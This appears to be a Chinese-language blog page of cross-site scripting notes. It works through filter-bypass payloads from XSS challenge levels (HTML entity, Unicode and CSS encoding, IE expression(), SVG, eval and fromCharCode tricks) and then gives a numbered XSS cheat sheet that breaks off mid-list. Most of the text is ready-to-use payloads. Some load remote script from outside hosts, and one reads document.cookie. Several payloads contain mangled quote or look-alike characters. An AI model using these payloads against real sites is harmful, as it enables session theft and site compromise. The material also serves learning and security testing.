<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(<span class="string">'XSS'</span>)%<span class="number">3</span>C/script%<span class="number">3</span>E</span><br><span class="line">%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(%<span class="number">22</span>xss%<span class="number">22</span>)%<span class="number">3</span>C/script%<span class="number">3</span>E  过滤了&lt; &gt; <span class="string">'</span></span><br><span class="line"><span class="string">&lt;script%20src%3D"http%3A%2F%2F0300.0250.0000.0001"&gt;  过滤了 &gt; : /</span></span><br></pre></td></tr></table></figure>

<h4 id="同时过滤script-标签和on-用-lt-a-href"><a href="#同时过滤script-标签和on-用-lt-a-href" class="headerlink" title="同时过滤script 标签和on  用&lt;a href"></a>同时过滤<code>script</code> 标签和<code>on</code>  用<code>&lt;a href</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str); 进行了替换</span><br><span class="line">str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"></span><br><span class="line"><span class="string">"&gt;&lt;a href="</span>javascript:alert(<span class="string">'xss'</span>)<span class="string">"&gt;1&lt;/a&gt;</span></span><br><span class="line"><span class="string">or</span></span><br><span class="line"><span class="string">"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:onclick=alert()"</span>&gt;</span>xss大法好<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line">or</span><br><span class="line"><span class="string">"&gt;&lt;a href="</span>javascript:alert(<span class="built_in">document</span>.domain)<span class="string">"&gt;xss大法好&lt;/a&gt;</span></span><br><span class="line"><span class="string">注意：需要点击返回页面中的超链接才能生成弹窗</span></span><br></pre></td></tr></table></figure>

<h4 id="无法大小写绕过和双写绕过-使用编码绕过-html实体编码"><a href="#无法大小写绕过和双写绕过-使用编码绕过-html实体编码" class="headerlink" title="无法大小写绕过和双写绕过  使用编码绕过  html实体编码"></a>无法大小写绕过和双写绕过  使用编码绕过  html实体编码</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">html实体编码（dec） ascii  javascri&amp;#112;t:alert(1)  &amp;#112;  还有分号不要忘记    javascri&amp;#112;t:alert(xss)错 字符串xss必须加引号</span><br><span class="line">html实体编码（hex）        javascri&amp;#x70;t:alert(1)  &amp;#x70;  </span><br><span class="line">javascri&amp;#112;t:alert(1)/*http://*/           /**/ php注释</span><br><span class="line">javascri&amp;#112;t:alert(1)//http://  可以</span><br><span class="line">javascri&amp;#112;t:alert(1)#http://  不知道为什么不行</span><br><span class="line">构造是 &amp;# 加十进制、十六进制 ASCII 码或 unicode 字符编码，而且浏览器解析的时候会先把 html 编码解析再进行渲染。但是有个前提就是必须要在“值”里，比如属性 src 里，但却不能对 src 进行 html 编码。不然浏览器无法正常的渲染。</span><br><span class="line"></span><br><span class="line">javasc&amp;#114ipt:alert(&amp;#34;http://")</span><br></pre></td></tr></table></figure>

<ul>
<li>此处也可以用两个反单引号` 来绕过对”的过滤。</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#114;ipt:alert(`http://`)</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">插入混淆字符，在css中，<span class="comment">/**/</span>是注释字符，除了<span class="comment">/**/</span>外，字符”\”和结束符”\<span class="number">0</span>″也是被忽略的</span><br><span class="line">(<span class="number">1</span>)能绕WAF的不止html实体，unicode编码也行如e -&gt; \<span class="number">0065</span> ，\u0065   ；\<span class="number">0065</span>xpression（这道题过滤了反斜杠，反斜杠零）</span><br><span class="line">(<span class="number">2</span>)在expression中加反斜杠分隔 ；ex\pression（不行，理由同上）</span><br><span class="line">(<span class="number">3</span>)在expression中加注释符<span class="comment">/**/</span>分隔；ex<span class="comment">/**/</span>pression  通过</span><br><span class="line">(<span class="number">4</span>)在expression中加反斜杠零分隔； ex\<span class="number">0</span>pression 通过</span><br><span class="line">expre<span class="comment">/**/</span>ssion(onmouseover=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="built_in">document</span>.domain)&#125;);</span><br><span class="line">expre\<span class="number">0</span>ssion(onmouseover=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="built_in">document</span>.domain)&#125;);</span><br><span class="line">here:expre<span class="comment">/**/</span>ssion(onmouseover=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="built_in">document</span>.domain)&#125;);</span><br><span class="line">here:expre<span class="comment">/**/</span>ssion (<span class="built_in">window</span>.x?<span class="number">0</span>:(alert (<span class="built_in">document</span>.domain),<span class="built_in">window</span>.x=<span class="number">1</span>));</span><br></pre></td></tr></table></figure>

<h4 id="替换了空格-script-使用-0a换行符绕过-0a-0b-0c-0d-回车换行-空格绕过"><a href="#替换了空格-script-使用-0a换行符绕过-0a-0b-0c-0d-回车换行-空格绕过" class="headerlink" title="替换了空格 script /  使用%0a换行符绕过 %0a %0b %0c %0d (回车换行) 空格绕过"></a>替换了空格 script /  使用%0a换行符绕过 %0a %0b %0c %0d (回车换行) 空格绕过</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%<span class="number">0</span>asrc=x%<span class="number">0</span>aonerror=alert(<span class="number">1</span>)&gt;  </span><br><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt; 肯定不能用了</span></span><br><span class="line"><span class="regexp">" onclick="alert(1)"  因为是在标签内部也不用</span></span><br></pre></td></tr></table></figure>


<h4 id="过滤了-和"><a href="#过滤了-和" class="headerlink" title="过滤了=和("></a>过滤了=和(</h4><ul>
<li>利用SVG标签</li>
</ul>
<p>该标签会将 XML 实体（转义序列）提前解析再加入标签，从而绕过过滤</p>
<p><code>&lt;svg&gt;&lt;script&gt;prompt&amp;#x28;1)&lt;/script&gt;</code></p>
<ul>
<li>也可以利用 JS 中的 eval 函数</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">eval</span>.call<span class="string">`<span class="subst">$&#123;<span class="string">'prompt\x281)'</span>&#125;</span>`</span>&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;prompt.call`$&#123;1&#125;`&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="alert-被过滤"><a href="#alert-被过滤" class="headerlink" title="alert 被过滤"></a>alert 被过滤</h4><ul>
<li>利用 Img 标签和 confirm 函数:</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# οnerrοr="confirm('xss')"&gt;</span><br><span class="line">or</span><br><span class="line">&lt;img src=# onerror="prompt(1)"&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>或者用 <strong>eval 函数String.fromCharCode 函数</strong>是把输入字符的 unicode 值转化为字符串</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"1"</span> οnerrοr=<span class="string">"eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))"</span>&gt;</span><br><span class="line">&lt;img src=<span class="string">'z'</span> οnerrοr=<span class="string">"String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41)"</span>&gt;</span><br><span class="line">利 用 iframe的src来 弹 窗 </span><br><span class="line">&lt;img src=<span class="string">"1"</span> onerror=<span class="built_in">eval</span>(<span class="string">"\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29"</span>)&gt;<span class="xml"><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h4 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"javascript:alert(2)"</span>&gt;</span><br><span class="line">如果存在 X-frame 选项，上述 Payload 失效</span><br></pre></td></tr></table></figure>

<h4 id="UTF-7-XSS-【internet-Explorer】"><a href="#UTF-7-XSS-【internet-Explorer】" class="headerlink" title="UTF-7 XSS  【internet Explorer】"></a>UTF-7 XSS  【internet Explorer】</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"  onmouseover="</span>alert(<span class="built_in">document</span>.domain)</span><br><span class="line">+ACIAIAAgAG8-n+AG0Abw-u+AHM-e+AG8Adg-e+AHIAPQBhAGw-e+AHIAdAAo-d+AG8AYw-u+AG0-en+AHQALg-d+AG8AbQBh-<span class="keyword">in</span>+ACk-</span><br><span class="line">并且修改charset为type=text，输入:UTF<span class="number">-7</span></span><br></pre></td></tr></table></figure>

<h4 id="还没被过滤-【internet-Explorer】"><a href="#还没被过滤-【internet-Explorer】" class="headerlink" title="``还没被过滤 `【internet Explorer】"></a>``还没被过滤 `【internet Explorer】</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">``</span>onfocus=alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure>

<h4 id="style-XSS【internet-Explorer】"><a href="#style-XSS【internet-Explorer】" class="headerlink" title="style XSS【internet Explorer】"></a>style XSS【internet Explorer】</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">行内样式的动态特性”(就是在ie下能在css中执行js代码)</span><br><span class="line">在CSS样式中利用expression实现javascript中的onmouseover或onmouseout事件，同样前提是IE</span><br><span class="line">expression(onmouseover=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="built_in">document</span>.domain)&#125;)</span><br><span class="line">&lt;div style=<span class="string">"height:expression(alert('XSS'),1)"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>（这个仅于IE7(含)之前有效）</span><br></pre></td></tr></table></figure>

<h4 id="其他编码"><a href="#其他编码" class="headerlink" title="其他编码"></a>其他编码</h4><h5 id="URL-编码"><a href="#URL-编码" class="headerlink" title="URL 编码"></a>URL 编码</h5><p>URL 只允许用 US-ASCII 字符集中可打印的字符 (0×20—0x7x)，其中某些字符在 HTTP 协议里有特殊的意义，所以有些也不能使用。这里有个需要注意的，+ 加号代表 URL 编码的空格，%20 也是。URL 编码最长见的是在用 GET/POST 传输时，顺序是把字符改成 %+ASCII 两位十六进制 ( 先把字符串转成 ASCII 编码，然后再转成十六进制 )。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(hex(ord(<span class="string">"Z"</span>)))</span><br></pre></td></tr></table></figure>

<p>这个在编码 DOM XSS 可能会用到</p>
<h5 id="unicode-编码"><a href="#unicode-编码" class="headerlink" title="unicode 编码"></a>unicode 编码</h5><p>Unicode 有 1114112 个码位，也就是说可以分配 1114112 个字符。Unicode 编码的字符以 %u 为前缀，后面是这个字符的十六进制 unicode 的码点。</p>
<p>Unicode 编码之所以被本文提到，因为有的站点过滤了某些字符串的话，但是发现这个站点在后端验证字符串的时候，识别 unicode 编码，那我们就可以把我们的攻击代码来改成 unicode 编码形式，就可以绕过站点的过滤机制了</p>
<h5 id="CSS-编码"><a href="#CSS-编码" class="headerlink" title="CSS 编码"></a>CSS 编码</h5><p>这个不是太常用。就是 / 斜杠加上 1-6 位十六进制</p>
<p>之前在 IE5 之前都可以用 expression 来调用 js 时，这个编码很有用。 现在大多都是用于 CSS 小图标。</p>
<p>用一个反斜线()后面跟1~6位的十六进制数字，例如e可以编码为“\65”或“65”或“00065”</p>
<h5 id="JS编码：js提供了四种字符编码的策略，"><a href="#JS编码：js提供了四种字符编码的策略，" class="headerlink" title="JS编码：js提供了四种字符编码的策略，"></a>JS编码：js提供了四种字符编码的策略，</h5><p>1、三个八进制数字，如果不够个数，前面补0，例如“e”编码为“\145”</p>
<p>2、两个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\x65”</p>
<p>3、四个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\u0065”</p>
<p>4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）</p>
<h5 id="复合编码："><a href="#复合编码：" class="headerlink" title="复合编码："></a>复合编码：</h5><p>所谓复合编码，也就是说输出的内容输出在多个环境中，例如</p>
<td onclick="”openUrl(add.do?userName=’<%=value%">’);”>11</td>

<p>value的内容首先出现在一个URL中，这个URL在一段javascript总，而javascript代码又是html的一部分。所以解码的顺序就是HTML解码–&gt;js解码–&gt;url解码，那么正确的编码顺序就应该是url编码–&gt;js编码–&gt;html编码。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">background-color:salmon;input:expression((<span class="built_in">window</span>.x==<span class="number">1</span>)?<span class="string">''</span>:(<span class="built_in">window</span>.x=<span class="number">1</span>,alert(<span class="built_in">document</span>.domain)))</span><br><span class="line"> xss:expr<span class="comment">/*XSS*/</span>ession(alert(<span class="built_in">document</span>.domain));</span><br><span class="line"><span class="number">1.</span>style=<span class="string">"color:expression(alert(document.domain))"</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> background:url(javascript:alert(<span class="string">'xss'</span>));</span><br><span class="line">   background:url(<span class="string">"javascript:alert(document.domain);"</span>);</span><br><span class="line"><span class="number">3.</span>xss:expression(alert(<span class="built_in">document</span>.domain));</span><br><span class="line">     &lt;img src=<span class="string">"#"</span>  style=<span class="string">"xss:expression(alert('xss'));"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">【<span class="number">5</span>】</span><br><span class="line">这一关开始是 flash xss 了，首先</span><br><span class="line">下载页面中的 flash，对源码进行分析，我用的</span><br><span class="line">是 JPEXS 这款工具。发现是 actionscript <span class="number">2.0</span>，</span><br><span class="line">首先定位 getURL 函数</span><br><span class="line"></span><br><span class="line">&lt;a href=<span class="string">"javascript:alert(document.domain)"</span>&gt;xss_by_SST&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">arg01=version&amp;arg02=&lt;a href="javascript:alert(document.domain)"&gt;xss_by_SST&lt;/</span>a&gt;</span><br><span class="line">	</span><br><span class="line">arg01=id&amp;arg02=\<span class="string">"))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(document.cookie)//&amp;width&amp;heigh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">document.write(location.hash.substring(1));</span></span><br><span class="line"><span class="string">的是利用 location.hash 获取 url 中 #后面的部分，这个 substring 是从第一个字符取到最后 --, </span></span><br><span class="line"><span class="string">#&lt;script&gt;alert()&lt;/script&gt; 就可以了。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://test.xss.tv/</span></span><br><span class="line"><span class="string">http://xss-quiz.int21h.jp</span></span><br><span class="line"><span class="string">http://prompt.ml/0</span></span><br><span class="line"><span class="string">https://alf.nu/alert1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xss challenge</span></span><br><span class="line"><span class="string">web_for_pentester完成</span></span><br></pre></td></tr></table></figure>

<h2 id="XSS跨站脚本攻击汇总"><a href="#XSS跨站脚本攻击汇总" class="headerlink" title="XSS跨站脚本攻击汇总"></a>XSS跨站脚本攻击汇总</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>) 普通的 XSS JavaScript 注入</span><br><span class="line">&lt;SCRIPT SRC=http:<span class="comment">//3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>) IMG 标签 XSS 使用 JavaScript 命令</span><br><span class="line">&lt;SCRIPT SRC=http:<span class="comment">//3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>) IMG 标签无分号无引号</span><br><span class="line">&lt;IMG SRC=javascript:alert(‘XSS’)&gt;</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>) IMG 标签大小写不敏感</span><br><span class="line">&lt;IMG SRC=JaVaScRiPt:alert(‘XSS’)&gt;</span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>) HTML 编码 (必须有分号)</span><br><span class="line">&lt;IMG SRC=javascript:alert(“XSS”)&gt;</span><br><span class="line">(<span class="number">6</span>) 修正缺陷 IMG 标签</span><br><span class="line">&lt;IMG “”<span class="string">"&gt;&lt;SCRIPT&gt;alert(“XSS”)&lt;/SCRIPT&gt;”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(7) formCharCode 标签 (计算器)</span></span><br><span class="line"><span class="string">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(8) UTF-8 的 Unicode 编码 (计算器)</span></span><br><span class="line"><span class="string">&lt;IMG SRC=jav.. 省略..S')&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(9) 7 位的 UTF-8 的 Unicode 编码是没有分号的 (计算器)</span></span><br><span class="line"><span class="string">&lt;IMG SRC=jav.. 省略..S')&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(10) 十六进制编码也是没有分号 (计算器)</span></span><br><span class="line"><span class="string">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61.. 省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(11) 嵌入式标签，将 Javascript 分开</span></span><br><span class="line"><span class="string">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(12) 嵌入式编码标签，将 Javascript 分开</span></span><br><span class="line"><span class="string">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(13) 嵌入式换行符</span></span><br><span class="line"><span class="string">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(14) 嵌入式回车</span></span><br><span class="line"><span class="string">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(15) 嵌入式多行注入 JavaScript, 这是 XSS 极端的例子</span></span><br><span class="line"><span class="string">&lt;IMG SRC=”javascript:alert(‘XSS‘)”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(16) 解决限制字符 (要求同页面)</span></span><br><span class="line"><span class="string">&lt;script&gt;z=’document.’&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;z=z+’write(“‘&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;z=z+’&lt;script’&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;z=z+’ src=ht’&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;z=z+’tp://ww’&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;z=z+’w.shell’&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;z=z+’.net/1.’&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;z=z+’js&gt;&lt;/sc’&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;z=z+’ript&gt;”)’&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;eval_r(z)&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(17) 空字符</span></span><br><span class="line"><span class="string">perl -e ‘print “&lt;IMG SRC=java\0script:alert(\”XSS\”)&gt;”;’ &gt; out</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(18) 空字符 2, 空字符在国内基本没效果。因为没有地方可以利用</span></span><br><span class="line"><span class="string">perl -e ‘print “&lt;SCR\0IPT&gt;alert(\”XSS\”)&lt;/SCR\0IPT&gt;”;’ &gt; out</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(19) Spaces 和 meta 前的 IMG 标签</span></span><br><span class="line"><span class="string">&lt;IMG SRC=”   javascript:alert(‘XSS’);”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(20)Non-alpha-non-digit XSS</span></span><br><span class="line"><span class="string">&lt;SCRIPT/XSS SRC=”http://3w.org/XSS/xss.js”&gt;&lt;/SCRIPT&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(21)Non-alpha-non-digit XSS to 2</span></span><br><span class="line"><span class="string">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(“XSS”)&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(22)Non-alpha-non-digit XSS to 3</span></span><br><span class="line"><span class="string">&lt;SCRIPT/SRC=”http://3w.org/XSS/xss.js”&gt;&lt;/SCRIPT&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(23) 双开括号</span></span><br><span class="line"><span class="string">&lt;&lt;SCRIPT&gt;alert(“XSS”);//&lt;&lt;/SCRIPT&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(24) 无结束脚本标记 (仅火狐等浏览器)</span></span><br><span class="line"><span class="string">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;</span></span><br><span 